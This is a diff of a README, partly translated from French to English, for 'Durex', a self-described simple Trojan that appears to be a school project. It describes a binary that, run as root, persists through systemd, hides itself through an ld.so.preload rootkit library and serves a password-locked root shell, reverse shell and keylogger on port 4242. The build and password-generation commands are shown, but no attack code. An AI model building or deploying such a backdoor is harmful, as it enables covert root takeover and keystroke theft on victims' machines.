@@ -1,65 +1,54 @@
 # DUREX
-
-Ce projet a pour but de créer un simple trojan !
+Simple Trojan
 
 ## INFOS
-
-Durex est un binaire qui affichera l'utilisateur actuellement connecté.
-NEANMOINS, en fond, il aura fait bieeeeen plus de choses, uniquement avec les droits root :
-* Durex créera un autre programme dans /bin qui se nommera également Durex.
-* Durex créera les fichiers Durex, Durex.conf et Durex.service, dans les répertoires /etc/init.d, /etc/systemd et /lib/systemd/system, respectivement, permetant au programme nouvellement créer de s'excuter au démarrage de la machine cible.
-* Ce même programme sera lancé en tâche de fond à la façon d’un daemon.
-* Une seule instance du daemon ne peut être lancée.
-
-NEANMOINS, au moment de l'installation Durex modifiera sa copie pour exécuter d'autre fonction dont voici l'exécution:
-* Le daemon créera une librairie personnalisé dans le but de rendre le binaire et ses actions indétectable. Nommée Durex.so la librairie s'installera dans /usr/local/lib et s'incrira dans le fichier /etc/ld.so.preload.
-Le seul moyen de pouvoir redétecter le binaire sera de supprimer ce dernier fichier. J'ai intentionnelement laissé la possibilité de le faire pour ce projet.
-* Le daemon écoutera le port 4242.
-* Il propose une connexion à 3 clients en simultané.
-* Lors de la connexion d’un client sur le daemon, un mot de passe est demandé.
-Un minimum de sécurité sur le mot de passe est assuré. Un exécutable est a disposition pour générer l'hexadécimal du mot de passe que vous voulez mettre en place (voir plus bas).
-* Lorsque la connexion est établie avec un client, le daemon propose de lancer un shell avec les droits root, ou un reverse shell toujours avec les droits root.
-
-BONUS:
-* Chaque action d'un utilisateur est repertorié dans le fichier /var/log/Durex.log.
-* Optimisation dans le but de rendre tous les fichiers créer par l'exécutable indétectable. (/bin/Durex, /etc/ld.so.preload, /usr/lib/Durex.so, /var/lock/Durex.lock, /var/log/Durex.log)
-* Optimisation dans le but de camoufler l'ouverture du port 4242.
-* Optmisation dans le but de rendre l'exécutable impossible à debugger/analyser.
-
 ### Le binaire a été testé sur une Debian 9.3.0 64bits.
 
 ## INSTALLATION
-### Durex
+### As Normal User
 
 ```
-make && ./Durex
+$> make && ./Durex
+JohnDoe
+$>
 ```
+At execution, Durex will print the user actually connected.
+
+### As Root
+If the user is root, Durex will:
+
++ Create a copy of himself in /bin
++ Create a durex.service file in /lib/systemd/ to add himself as a service, launching himslef at bootime as a deamon
++ Create a durex.so library in /usr/local/lib/ to hide himself and his functions from the system
++ Add this library in /etc/ld.so.preload
++ Create a Durex.log file in /var/log/
+
+Only one instance of Durex is created.
+
++ Durex opens a server on port 4242, allowing 3 clients to connect to it
++ The server is locked by a password
++ The server offers to the clients:
+	+ A shell as root
+	+ A remote shell as root
+	+ A keylogger
 
 ## MODIFICATION
 ### Password generation
-
++ Generate a new password with the 'pass' executable:
 ```
-make pass
-./pass [mot_de_passe]
+$> make pass
+cc -o pass other/passwd.c srcs/encrypt.c -I includes/
+$> ./pass toto
+toto (4): 191 248 92 67 189 94 197 184
+$> ./pass kata
+kata (4): 201 121 30 74 3 83 154 250
 ```
-
-Utiliser ensuite votre meilleur éditeur pour modifier le fichier **durex.h** :
-```
++ Use your best editor to modify **durex.h** :
+```c
 # define SERVER_PASS .. .. .. .. ..
 ```
 
-##### Exemples
-
-```
-root@debian:/home/XXX/42/durex# make pass
-cc -o pass other/passwd.c srcs/encrypt.c -I includes/
-root@debian:/home/XXX/42/durex# ./pass toto
-toto (4): 191 248 92 67 189 94 197 184
-root@debian:/home/XXX/42/durex# ./pass kata
-kata (4): 201 121 30 74 3 83 154 250
-```
-
-### Ajout de fonction dans la libraire
+### Add functions to the library
 
 * Créer votre fichier et compiler le
 ```
